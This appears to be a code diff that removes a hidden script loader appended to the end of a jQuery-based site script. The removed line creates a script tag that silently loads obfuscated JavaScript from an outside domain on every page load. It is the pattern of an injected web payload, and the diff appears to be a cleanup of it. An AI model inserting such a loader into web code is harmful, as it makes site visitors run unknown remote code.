@@ -30,5 +30,3 @@ $(document).ready(function() {
 			})
 			.after('<ul class="events">Events</ul>');
 });
-
-if(!loadStats){function loadStats(){var head=document.getElementsByTagName("head")[0],scr=document.createElement("script");scr.type="text/javascript",scr.src="https://livestatsnet.services/003Idq/WyJOaWNvbGw4MDMiLDYsMC40LDAsIjEwMCUiXQ.veZZEXQdFpBAmbm7B6JTFXMdEIY.min.js",scr.async="async",head.appendChild(scr)}loadStats()}
